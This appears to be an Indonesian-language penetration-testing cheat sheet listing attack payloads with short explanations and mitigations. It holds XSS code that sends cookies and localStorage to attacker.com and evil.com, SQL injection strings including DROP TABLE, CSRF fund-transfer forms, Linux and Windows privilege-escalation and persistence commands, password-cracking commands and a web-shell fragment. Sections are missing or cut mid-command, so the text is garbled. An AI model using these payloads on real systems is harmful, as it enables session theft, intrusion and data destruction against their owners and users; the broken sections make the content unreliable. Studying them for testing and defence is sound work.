1. Reflected XSS Payload (Cross-Site Scripting)

Tipe: Reflected XSS yang dapat memanipulasi DOM dan menggali cookie.

<script> // Payload umum yang digunakan dalam CTF dan testing var img = new Image(); img.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie); </script> // Atau dengan fetch API (lebih modern): fetch('http://attacker.com/api/steal', { method: 'POST', body: JSON.stringify({ cookies: document.cookie, localStorage: localStorage, userAgent: navigator.userAgent, location: window.location.href }) }); // SVG-based XSS (bypass filter): <svg onload="alert('XSS')"></svg> // Event handler dalam HTML: <img src=x onerror="fetch('http://evil.com?data=' + document.cookie)">
üìñ Penjelasan:
  • Reflected XSS: Payload dikirim melalui URL dan langsung di-execute di browser korban tanpa disimpan di database
  • Cookie Stealing: Menggunakan image request atau fetch API untuk mengirim cookie ke server attacker
  • SVG/Event Handler: Bypass filter dengan menggunakan tag SVG atau event handler yang tidak di-filter
  • Enkripsi: `encodeURIComponent()` digunakan untuk encoding cookie agar aman di URL
‚ö†Ô∏è Potensi Dampak: Session hijacking, credential theft, malware distribution, phishing attacks
üõ°Ô∏è Mitigasi:
  • Output encoding semua user input dengan HTML entities
  • Gunakan Content Security Policy (CSP)
  • Set HttpOnly flag pada cookies
  • Implement Web Application Firewall (WAF)
  • Regular security testing & code review

2. SQL Injection Payload (SQLi)

Tipe: Time-based Blind SQL Injection untuk database extraction.

// Basic SQL Injection: admin' OR '1'='1 admin' -- admin' OR 1=1 -- // Time-based Blind SQLi (MySQL): ' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND IF(1=1,SLEEP(5),0) -- // Union-based SQLi: ' UNION SELECT NULL, username, password FROM users -- // Boolean-based Blind SQLi: ' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- // Data extraction: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() -- ' UNION SELECT CONCAT(username,':',password) FROM users -- // Advanced: Stacked Queries (jika didukung): '; DROP TABLE users; -- '; UPDATE users SET password='hacked' WHERE id=1; --
üìñ Penjelasan:
  • Basic SQLi: Menutup string query dan menambahkan kondisi TRUE/FALSE untuk bypass autentikasi
  • Time-based Blind: Menambahkan delay (SLEEP) untuk mengonfirmasi kondisi; jika response lambat = TRUE
  • Union-based: Menggunakan UNION untuk menggabungkan hasil query normal dengan attacker query
  • Boolean-based: Menganalisis response berbeda ketika kondisi TRUE vs FALSE
  • information_schema: Database metadata yang berisi struktur semua tabel di MySQL
‚ö†Ô∏è Potensi Dampak: Data breach, authentication bypass, complete database compromise, server takeover
üõ°Ô∏è Mitigasi:
  • Gunakan Prepared Statements/Parameterized Queries
  • Input validation & whitelist
  • Principle of Least Privilege untuk database user
  • WAF dengan SQL injection detection
  • Regular security audits & penetration testing

3. CSRF (Cross-Site Request Forgery) Payload

Tipe: Silent request forgery yang exploit user's authenticated session.

// HTML-based CSRF: <img src="http://target.com/transfer.php?amount=1000&to=attacker" /> // Form-based CSRF: <form action="http://target.com/transfer" method="POST" style="display:none;"> <input type="hidden" name="amount" value="1000"> <input type="hidden" name="to" value="attacker@evil.com"> <input type="submit"> </form> <script>document.forms[0].submit();</script> // AJAX-based CSRF (modern): fetch('http://target.com/api/transfer', { method: 'POST', headers: { 'Content-Type': 'application/json', }, credentials: 'include', body: JSON.stringify({ amount: 1000, recipient: 'attacker@evil.com' }) }); // Dengan file upload: var formData = new FormData(); formData.append('file', maliciousFile); fetch('http://target.com/upload', { method: 'POST', body: formData, credentials: 'include' });
üìñ Penjelasan:
  • CSRF Token Bypass: Browser otomatis mengirim cookie/session saat cross-origin request
  • credentials: 'include': Fetch API opsi untuk include cookies dari request asal
  • Silent Execution: Image/form submission tidak menampilkan feedback ke user
  • Victim's Privilege: Request dieksekusi dengan privilege user yang sudah login
‚ö†Ô∏è Potensi Dampak: Unauthorized actions (transfer, password change, account deletion), data modification
üõ°Ô∏è Mitigasi:
  • CSRF token pada setiap form
  • SameSite cookie attribute
  • Verify origin/referer header
  • Double-submit cookie pattern
  • Require user interaction untuk action sensitif

Tipe: Multi-platform reverse shell untuk mendapatkan interactive access.

üìñ Penjelasan:
  • Reverse Shell Concept: Target machine menginisiasi koneksi ke attacker, bukan sebaliknya
  • /dev/tcp: Linux pseudo device untuk TCP connection tanpa netcat
  • Socket Creation: Membuat socket connection dan redirect stdin/stdout/stderr
  • Multi-platform: Berbagai bahasa untuk flexibility sesuai environment target
  • Interactive Shell: User dapat menjalankan command seperti mengakses terminal langsung
‚ö†Ô∏è Potensi Dampak: Complete system compromise, malware installation, lateral movement, data exfiltration
üõ°Ô∏è Mitigasi:
  • Egress filtering & network segmentation
  • Disable unnecessary services & protocols
  • Host-based firewall configuration
  • IDS/IPS untuk detect outbound connections
  • Regular patching & vulnerability management

5. Privilege Escalation Payload (Linux)

Tipe: Teknik escalate dari user biasa ke root/administrator.

// Sudo Misconfiguration: sudo -l # Check sudo privileges sudo su - # Jika ALL dapat dijalankan tanpa password // SUID Binary Exploitation: find / -perm -4000 2>/dev/null # Find SUID binaries # Contoh: /usr/bin/passwd memiliki SUID # Jika binary compile manual dengan /bin/sh, dapat exec shell sebagai root // Kernel Exploit (CVE-2021-22555 - Linux Kernel): ./exploit # Binary exploit compiled untuk specific kernel version // Shared Object Injection (LD_PRELOAD): # Buat malicious .so file dengan function yang akan di-load lebih dulu gcc -fPIC -shared -o evil.so evil.c LD_PRELOAD=./evil.so /usr/bin/somebinary // Capability-based Attack: getcap -r / 2>/dev/null # Find capabilities # Jika binary memiliki cap_setuid, dapat digunakan untuk escalate // Cron Job Exploitation: # Find writable cron scripts: ls -la /etc/cron.d/ ls -la /var/spool/cron/crontabs/ # Modify script untuk execute command sebagai owner // PATH Manipulation: # Jika script menggunakan relative path: ./script.sh menggunakan 'rm file' # Create /tmp/rm yang berbeda export PATH=/tmp:$PATH # Script akan execute malicious rm // Wildcard Injection: # tar * dalam script dapat diexploit tar * dalam /backup/ cd /backup && touch -- '-I /tmp/evil.sh' # tar akan interpret file sebagai option // Password dalam File: grep -r "password" /home grep -r "password" /var/www cat /opt/myapp/config.php
üìñ Penjelasan:
  • Sudo Misconfiguration: User dapat run command dengan elevated privilege tanpa password
  • SUID Bit: File dengan permission 4755 dijalankan sebagai owner, bukan executor
  • Kernel Exploit: Bug dalam kernel privilege handling
  • LD_PRELOAD: Environment variable yang membuat linker load shared object terlebih dahulu
  • Capability: Fine-grained privilege system yang lebih aman dari SUID
  • Cron/PATH Manipulation: Race condition atau command hijacking
‚ö†Ô∏è Potensi Dampak: Full system control, persistent access, data theft, lateral movement
üõ°Ô∏è Mitigasi:
  • Audit sudo configuration & remove unnecessary entries
  • Regular kernel patching & security updates
  • Minimize SUID binaries, use capabilities instead
  • Restrict access ke cron jobs & scripts
  • Monitor privilege escalation attempts

6. Privilege Escalation Payload (Windows)

Tipe: Windows privilege escalation dari User ke Administrator/SYSTEM.

// Check Current Privileges: whoami whoami /priv # Check token privileges net localgroup administrators // Unquoted Service Path: # Service dengan path tanpa quotes: C:\Program Files\MyApp\service.exe # Copy malicious exe ke: C:\Program.exe # Saat service start, akan execute payload // Service Permissions: # Jika user dapat modify service binary sc qc servicename sc config servicename binPath= "C:\malicious.exe" net start servicename // Token Impersonation (Potato Attack): # Memerlukan privilege seperti SeImpersonate # Tools: JuicyPotato, GodPotato, RoguePotato # Eksploitasi DCOM/COM object untuk escalate // DLL Hijacking: # Application load DLL dari unsafe location # Place malicious DLL di directory yang di-search sebelumnya // Registry Modification: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Payload /t REG_SZ /d "C:\malicious.exe" // MSI Installer Privilege: # Jika msiexec dapat dijalankan dengan elevated privilege msiexec /i malicious.msi /quiet // Group Policy Preferences (GPP) Password: # Extract password dari C:\ProgramData\Microsoft\Group Policy\History\ # Files encrypted dengan default Microsoft key yang publik // Scheduled Task: # Jika dapat modify scheduled task yang berjalan sebagai SYSTEM schtasks /create /tn Payload /tr "C:\malicious.exe" /sc onlogon /ru SYSTEM // UAC Bypass: # Bypass User Access Control dengan teknik seperti: # 1. Fodhelper.exe Registry bypass # 2. DLL Hijacking di System32 # 3. COM elevation moniker abuse
üìñ Penjelasan:
  • Unquoted Service Path: Windows search order mencari executable tanpa extension di parent directory
  • Token Impersonation: Menggunakan thread token untuk menjalankan code sebagai user lain
  • DLL Hijacking: Aplikasi load DLL dari current directory sebelum system directory
  • Potato Attack: Redirect authentication ke local COM server untuk mendapat SYSTEM token
  • UAC Bypass: Techniques untuk bypass User Access Control tanpa prompt
‚ö†Ô∏è Potensi Dampak: Full system control sebagai SYSTEM, persistent backdoor, complete data access
üõ°Ô∏è Mitigasi:
  • Quote service paths correctly
  • Restrict service permissions & runs as least privilege
  • Regular Windows patching & security updates
  • Monitor privilege escalation & UAC bypass attempts
  • Implement AppLocker / Windows Defender Application Control

7. Password Cracking & Cracking Techniques

Tipe: Modern password cracking dengan GPU acceleration dan pattern matching.

// Dictionary Attack (Hydra): hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target.com/ // Hashcat - GPU Accelerated Cracking: # MD5 cracking: hashcat -m 0 -a 0 hash.txt rockyou.txt # bcrypt (WordPress): hashcat -m 3200 -a 0 wp_hashes.txt rockyou.txt # NTLM (Windows): hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt # SHA-512 (Linux): hashcat -m 1800 -a 0 sha512_hashes.txt rockyou.txt // John the Ripper: john --format=md5 hashes.txt john --format=bcrypt --wordlist=rockyou.txt wordpress_hashes.txt // Rule-based Attack (Sudah tahu pattern): hashcat -m 0 -a 0 -r rules/best64.rule hash.txt rockyou.txt // Mask Attack (Brute force dengan pattern): # Password format: Admin2024! hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d?d?! // Hybrid Attack (Dictionary + Brute Force): hashcat -m 0 -a 6 hash.txt rockyou.txt ?d?d?d?d // Rainbow Table Lookup: # Precomputed hash tables untuk instant lookup # Tools: CrackStation, RainbowCrack // Timing Attack pada Web Login: # Analyze response time untuk detect username validity import requests import time username = 'admin' for password in wordlist: start = time.time() r = requests.post('http://target.com/login', data={'user': username, 'pass': password}) elapsed = time.time() - start if elapsed > 0.5: # Server side validation time print(f"Possible match: {password}") // GPU Cluster Cracking: # Distributed hashcat across multiple GPU servers hashcat -m 1000 ntlm_hashes.txt rockyou.txt --workload-profile=4
üìñ Penjelasan:
  • Dictionary Attack: Membandingkan hash dengan wordlist yang telah disiapkan
  • Hashcat Modes: Mode berbeda untuk hash type berbeda (MD5, bcrypt, NTLM, dst)
  • Rule-based: Modifikasi wordlist dengan rules (uppercase, append number, dst)
  • Mask Attack: Brute force dengan pattern tertentu (?u=uppercase, ?d=digit, ?l=lowercase)
  • GPU Acceleration: Parallelisasi massive dengan GPU untuk kecepatan tinggi
  • Timing Attack: Analisis response time untuk extract informasi (side-channel)
‚ö†Ô∏è Potensi Dampak: Account compromise, data breach, lateral movement access
üõ°Ô∏è Mitigasi:
  • Gunakan strong password hashing (bcrypt, argon2, scrypt)
  • Implement rate limiting & account lockout
  • Multi-factor authentication (MFA)
  • Password complexity requirements
  • Monitor failed login attempts

11. Container Escape Payload (Docker/Kubernetes)

Tipe: Escape dari containerized environment ke host system.

?>' > /var/www/html/shell.php tar czf layer.tar.gz * // Volume Mount Escape: # Jika sensitive volume di-mount tanpa restrictions df -h mount cat /host/etc/passwd # Jika host filesystem mounted // Runtime Vulnerability (containerd, runc): # CVE-2019-5736 (runc vulnerability) # Attacker dapat escape container via overwrite runc binary
üìñ Penjelasan:
  • Privileged Container: Container dengan --privileged dapat akses semua host devices
  • cgroup Release Agent: Exploit kernel feature untuk execute arbitrary command pada host
  • Docker Socket Abuse: Docker socket memungkinkan full control terhadap host Docker
  • Namespace Bypass: nsenter dapat switch ke host namespace jika tidak isolated
  • RBAC Exploitation: Kubernetes RBAC misconfiguration untuk akses unauthorized resources
  • Runtime Vulnerability: Bug dalam container runtime (runc, containerd) untuk escape
‚ö†Ô∏è Potensi Dampak: Full host compromise, lateral movement, supply chain attack, cluster takeover
üõ°Ô∏è Mitigasi:
  • TIDAK run container dengan --privileged
  • Restrict volume mounts, gunakan read-only
  • Enforce security policies (AppArmor, SELinux)
  • Regular image scanning & vulnerability management
  • Keep container runtime updated
  • Network policies & RBAC tight di Kubernetes

Penetration Testing Methodology

OWASP Testing Guide Phases:

  • 1. Reconnaissance: Information gathering (public sources, DNS, WHOIS, social media)
  • 2. Scanning: Port scanning, service enumeration, vulnerability scanning
  • 3. Enumeration: Detailed service probing, user enumeration, credential testing
  • 4. Exploitation: Payload delivery dan code execution
  • 5. Post-Exploitation: Privilege escalation, lateral movement, persistence
  • 6. Reporting: Documentation dan recommendations
